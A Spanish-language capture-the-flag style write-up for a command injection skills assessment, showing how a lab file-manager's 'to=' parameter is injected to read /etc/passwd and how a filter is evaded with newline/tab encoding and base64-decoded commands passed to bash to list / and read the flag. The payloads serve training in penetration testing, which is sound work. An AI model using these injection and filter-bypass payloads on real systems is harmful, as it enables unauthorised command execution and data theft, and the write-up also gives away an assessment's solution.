
# Command Injection - Skills Assesment

Nos han contratado para realizar una prueba de penetración para una empresa y, durante la prueba, descubrimos una aplicación web de administración de archivos interesante. Como los administradores de archivos suelen ejecutar comandos del sistema, nos interesa probar vulnerabilidades de inyección de comandos.

Utiliza las diversas técnicas presentadas en este módulo para detectar una vulnerabilidad de inyección de comandos y luego explotarla, evadiendo cualquier filtro existente.

***

```
Objetivo: 94.237.59.180:46552

User "guest"
Password "guest"
```

<figure><img src="/files/AcforWHrKbsS6rL1pMM0" alt=""><figcaption></figcaption></figure>

Al acceder con las credenciales que nos proporciona el cliente entramos a un administrador de archivos, y vemos que se añade el parámetro `?to=` a la url:

<figure><img src="/files/Y85RbprXJm59vsKTB264" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Detección de Command Injection</mark>

Detectamos que en la funcionalidad de copiar devuelve un error en el front, lo que nos permitiría explotar un command injection:

<figure><img src="/files/4rw367JB62uumku2yKZN" alt=""><figcaption></figcaption></figure>

Observamos que se añade un nuevo parámetro `from=`

<figure><img src="/files/klf8xpx8xSals1zQBwSd" alt=""><figcaption></figcaption></figure>

En el request observamos que se envía por GET con el siguiente formato:

```
GET /index.php/index.php?to=&from=51459716.txt&finish=1&move=1
```

<figure><img src="/files/oWKcnF6dhPWVV61n4Dqc" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Prueba de inyección de comandos</mark>

Vamos a probar a modificar la solicitud para intentar leer el archivo `/etc/passwd`:

```
GET /index.php/index.php?to=;cat+/etc/passwd;&from=51459716.txt&finish=1&move=1
                            |---------------|
                                 Payload
```

<figure><img src="/files/OEUObczxvIgHJODmghBF" alt=""><figcaption></figcaption></figure>

Vemos que funciona pero hay algún tipo de filtro que lo detecta como malicioso.

## <mark style="color:purple;">Bypass de filtros</mark>

Vamos a probar a listar los archivos del directorio raiz `/` con el objetivo de encontrar la flag. El comando `ls /` también lo considera malicioso, así que vamos a hacer el bypass:

<figure><img src="/files/0mFTGJwwVhcV0e9x4V6S" alt=""><figcaption></figcaption></figure>

### 1. Codificar comando en Base64

```bash
echo  "ls /" | base64 
bHMgLwo=
```

### 2. URL con payload codificado

{% code title="payload" %}

```
%0a%09bash<<<$(base64%09-d<<<bHMgLwo=)
```

{% endcode %}

```
GET /index.php/index.php?to=%0a%09bash<<<$(base64%09-d<<<bHMgLwo=)&from=51459716.txt&finish=1&move=1
                            |------------------------------------|
```

<figure><img src="/files/En2pTIhZL9OF8EgjWVz9" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Extracción de la flag</mark>

Vamos a repetir los mismos pasos pero enfocado a leer la flag del directorio /.

### 1. Codificar comando en base64

```bash
echo  "cat /flag.txt" | base64 
Y2F0IC9mbGFnLnR4dAo=
```

### 2. URL con payload codificado

{% code title="payload" %}

```
%0a%09bash<<<$(base64%09-d<<<Y2F0IC9mbGFnLnR4dAo=)
```

{% endcode %}

```
GET /index.php/index.php?to=%0a%09bash<<<$(base64%09-d<<<Y2F0IC9mbGFnLnR4dAo=)&from=51459716.txt&finish=1&move=1
                            |------------------------------------------------|
```

<figure><img src="/files/rxEHR1L0PlEwvZKZv6kn" alt=""><figcaption></figcaption></figure>

Extraemos la flag sin problema!
